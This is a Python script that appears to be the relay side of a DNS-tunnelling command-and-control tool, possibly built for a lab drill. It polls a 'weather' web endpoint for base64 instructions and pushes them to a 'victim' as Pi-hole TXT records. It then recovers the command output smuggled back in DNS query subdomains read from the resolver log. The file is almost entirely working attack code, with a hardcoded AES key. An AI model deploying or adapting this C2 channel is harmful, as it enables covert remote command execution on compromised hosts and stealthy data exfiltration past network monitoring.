#!/usr/bin/env python

from Crypto.Cipher import AES
import argparse
import os
import platform
import subprocess
import datetime
import time
import socket

from base64 import b64encode, b64decode
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

import json
import requests
from bs4 import BeautifulSoup

VICTIM_LIST = 'VICTIMS'
SERVER_ADDR = 'http://10.150.0.7:8888/weather'
HOST = ''
DNS_IP = "10.150.0.8"
DNS_PORT = 53
DNS_SIGNAL_PORT = 1004
DNS_RECORD_FILE = '/etc/dnsmasq.d/02-lan.conf'
DNS_LOG_FILE = '/var/log/pihole.log'

class TryLoop:

    def __init__(self, profile):
        self.profile = profile
        self.victim_details = dict()

    def start(self):
        print('Starting drill...')
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('', DNS_SIGNAL_PORT))
        data, addr = sock.recvfrom(512)
        print('Connected!')
        mac, ip, host, platform, pid = (data.decode('utf-8')).split(';')
        self.victim_details['mac'] = mac
        self.victim_details['ip'] = ip
        self.profile['host'] = host
        self.profile['platform'] = platform
        self.profile['pid'] = pid
        while True:
            try:
                self.profile['results'] = []
                print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
                beacon = self._send_beacon()
                instructions = self._next_instructions(beacon=beacon)
                sleep = self._handle_instructions(instructions, sock)
                time.sleep(sleep)
            except Exception as e:
                print('[-] Operation loop error %s' % e)
                time.sleep(30)
            """command = str(input())
            to = str(input())
            output = self.exec(command, to, sock)
            print(output)"""

    def _send_beacon(self):
        website = '%s?profile=%s' % (self.profile['server'] + "/weather", self._encode_string(json.dumps(self.profile)))
        return requests.get(website)

    def _next_instructions(self, beacon):
        soup = BeautifulSoup(beacon.content, 'html.parser')
        instructions = soup.find(id='instructions')
        return json.loads(self._decode_bytes(instructions.contents[0]))

    def _handle_instructions(self, instructions, sock):
        self.profile['paw'] = instructions['paw']
        for instruction in json.loads(instructions['instructions']):
            result, seconds = self._execute_instruction(json.loads(instruction), sock)
            self.profile['results'].append(result)
            self._send_beacon()
            self.profile['results'] = []
            time.sleep(seconds)
        else:
            self._send_beacon()
        return instructions['sleep']

    def _execute_instruction(self, i, sock):
        print('[+] Running instruction: %s' % i['id'])
        cmd = self._decode_bytes(i['command'])
        print("Executing the command:", cmd, "with timeout:", i['timeout'])
        output = self.exec(cmd, i['timeout'], sock)
        #output = subprocess.check_output(cmd, shell=True, timeout=i['timeout'])
        return dict(output=self._encode_string(output), pid=os.getpid(), status=0, id=i['id']), i['sleep']

    def exec(self, command, timeout, sock):
        entry = "txt-record=cmd.bark-bark.tree,\""
        encryptedCommand = b64encode(command.encode('utf-8')) #self.encrypt(command)
        entry += encryptedCommand.decode('utf-8')
        entry += ";"
        entry += str(timeout)
        entry += "\""
        entry += "\n"
        with open(DNS_RECORD_FILE, "w") as f:
            f.write(entry)

        subprocess.call(['/usr/sbin/service', 'pihole-FTL', 'restart'], shell=False)
        time.sleep(3)
        print("Sending command signal...")
        exec_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        exec_sock.sendto("1".encode('utf-8'), (self.victim_details['ip'], DNS_PORT))
        print("Receiving output from", self.victim_details['ip'], "...")
        sock.recvfrom(512)
        #data, addr = sock.recvfrom(512)
        #out = (b64decode(data)).decode('utf-8', errors='ignore')
        out = self._get_output()
        print("Instruction output:", out)
        return out

    def _get_output(self):
        log = open(DNS_LOG_FILE, "r")
        last_log = (log.readlines()[-1]).split()
        print(last_log)
        log.close()
        url = last_log[5]
        parts = url.split('.')
        if (parts[0] == 'normal'):
            return ""
        output = ""
        for part in parts:
            output += part
        print(output)
        output = b64decode(output).decode('utf-8', errors='ignore')
        return output


    # utils
    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        key = hashlib.sha256("g0vwQgZcBCfFNduQCGFVUvudv8gUMPYp".encode()).digest()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return b64encode(iv + cipher.encrypt(raw.encode()))

    def _pad(self, s):
        bs = AES.block_size
        return s + (bs - len(s) % bs) * chr(bs - len(s) % bs)

    @staticmethod
    def _decode_bytes(s):
        return b64decode(s).decode('utf-8', errors='ignore').replace('\n', '')
    
    @staticmethod
    def _encode_string(s):
        return str(b64encode(s.encode()), 'utf-8')

def build_profile(server_addr):
    return dict(
        server=server_addr,
        executors=['sh']
    )

if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start here')
    parser.add_argument('-W', '--website', required=False, default='http://10.150.0.7:8888')
    args = parser.parse_args()
    SERVER_ADDR = args.website
    p = build_profile('%s' % args.website)
    l = TryLoop(profile=p)
    l.start()
